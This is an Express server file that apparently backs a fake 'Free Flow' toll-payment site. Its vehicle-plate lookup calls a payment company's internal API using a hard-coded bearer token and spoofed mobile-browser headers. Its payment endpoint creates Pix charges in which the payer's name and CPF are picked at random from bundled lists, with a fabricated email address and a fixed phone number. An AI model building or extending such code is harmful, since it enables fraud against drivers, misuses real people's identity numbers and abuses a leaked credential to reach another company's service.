import express from 'express'
import axios from 'axios'
import cors from 'cors'
import dotenv from 'dotenv';
import { v4 as uuidv4 } from 'uuid';
import data from './data/names.json' with { type: 'json' };
import cpfData from './data/cpfs.json' with { type: 'json' };
dotenv.config()



const app = express()

const corsOptions = {
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type']
};

app.use(cors(corsOptions));
app.use(express.json())




const searchPlate = async (plate) => {
    try {
        const response = await axios.get(`https://zpy-customer-communication-ecommerce-bff.usezapay.com.br/api/v1/vehicle/${plate}`, {
            headers: {
                "accept": "application/json, text/plain, */*",
                "accept-language": "en-US,en;q=0.9",
                "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHBpcmVfYXQiOjIwNzM2MDA2MjMuNDAwMDQzLCJ1c2VyX2lkIjoiNzUwNTU5OCIsImF1ZCI6IkpGVlBKdTBIQzNhM1JJeG9BMTVXYXRHeUpkSDk3QmdpIiwiaXNzIjoiaHR0cDpsb2NhbGhvc3Q6ODAwMC8iLCJpYXQiOjE3NzM2MDA2MjMuNDAwMDIyLCJqdGkiOiJOb25lIn0.9JXl1c9WRyYFydlKOFcG5ECC5M0Vu3Gzip96b73H2e8",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "test_refresh_token": "true",
                "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36"
            },
            referrer: "https://app.usezapay.com.br/",
            timeout: 15000, // 15 segundos de timeout
            withCredentials: true
        });
        
        console.log("API Response Status:", response.status);
        console.log("Vehicle Data:", response.data);
        return response.data;
        
    } catch (error) {
        console.error("Error in searchPlate:");
        
        if (error.response) {
            // A requisição foi feita e o servidor respondeu com status diferente de 2xx
            console.error("Response Status:", error.response.status);
            console.error("Response Headers:", error.response.headers);
            console.error("Response Data (first 500 chars):", 
                typeof error.response.data === 'string' 
                    ? error.response.data.substring(0, 500) 
                    : JSON.stringify(error.response.data).substring(0, 500));
            
            // Verifica se a resposta é HTML
            if (typeof error.response.data === 'string' && error.response.data.includes('<html')) {
                throw new Error("API returned HTML instead of JSON. The endpoint might be blocking requests from Vercel.");
            }
            
            throw new Error(`API Error: ${error.response.status} - ${JSON.stringify(error.response.data)}`);
            
        } else if (error.request) {
            // A requisição foi feita mas nenhuma resposta foi recebida
            console.error("No response received:", error.request);
            throw new Error("No response received from API. Check network connectivity.");
            
        } else {
            // Algo aconteceu na configuração da requisição
            console.error("Request setup error:", error.message);
            throw new Error(`Request error: ${error.message}`);
        }
    }
}

app.get('/api/vehicle-lookup', async (req, res) => {
    try {
        const { plate } = req.query;
        
        if (!plate) {
            return res.status(400).json({ 
                success: false,
                error: "Plate is required" 
            });
        }
        
        // Valida formato da placa (opcional)
        if (plate.length < 6 || plate.length > 8) {
            return res.status(400).json({ 
                success: false,
                error: "Invalid plate format" 
            });
        }
        
        console.log(`Searching for plate: ${plate}`);
        const response = await searchPlate(plate);
        
        return res.json({
            success: true,
            data: response,
            plate: plate
        });
        
    } catch (error) {
        console.error("Vehicle lookup error:", error.message);
        
        return res.status(500).json({ 
            success: false,
            error: "Failed to fetch vehicle data",
            details: error.message,
            plate: req.query.plate
        });
    }
});



app.post('/api/create-payment', async (req, res) => {

    const name = searchNames();
    const cpf = searchCpfs()
    const { amount } = req.body
 

    const formattedEmail = `${name.toLowerCase().replace(/\s+/g, '.')}@gmail.com`
    const newValue = Math.round(amount * 100)

    const pixData = {
        customer: {
            document: {
                number: cpf,
                type: "cpf"
            },
            name: name,
            email: formattedEmail,
            phone: "19995949392"
        },
        pix: {
            expiresInDays: 1
        },
        amount:newValue,
        paymentMethod: "pix",
        items: [
            {
                tangible: false,
                title: "Free Flow",
                unitPrice: newValue,
                quantity: 1
            }
        ]
    };

    const url = process.env.URL || "https://api.velana.com.br/v1/transactions";
    const secretKey = process.env.SECRET_KEY;

    const auth = 'Basic ' + Buffer.from(`${secretKey}:x`).toString('base64');
    try {
        const response = await axios.post(url,
            pixData,
            {
                headers: {
                    accept: 'application/json',
                    authorization: auth,
                    'content-type': 'application/json'
                },
            });

            const data = response.data;
        return res.json({ data, success: true })


    } catch (error) {
        console.log(error.response.data)

    }
})


app.get('/api/verify-status/:id', async (req, res) => {
    const { id } = req.params;

    const secretKey = process.env.SECRET_KEY;
    const auth = 'Basic ' + Buffer.from(`${secretKey}:x`).toString('base64');
    const url = process.env.URL || "https://api.velana.com.br/v1/transactions"
    try {



        const response = await axios.get(`${url}/${id}`,

            {
                headers: {
                    accept: 'application/json',
                    authorization: auth,
                    'content-type': 'application/json'
                },
            }
        )
        const status = response.data.status
        return res.json({status})
    } catch (error) {
        return res.status(400).json(error)
    }
})

const searchNames = () => {
    const nomes = data.nomes
    const randomName = nomes[Math.floor(Math.random() * nomes.length)];

    return randomName;
}

const searchCpfs = () => {
    const cpfs = cpfData.cpfs;
    const randomCpf = cpfs[Math.floor(Math.random() * cpfs.length)]

    return randomCpf;
}


app.get('/api/healthy', (req, res) => {
    return res.status(200).json({ message: "✅🏴‍☠️🏴‍☠️ API IS UP AND WORKING.." })
})

const PORT = process.env.PORT || 5004;


app.listen(PORT, () => {
    console.log("Server is running....")
})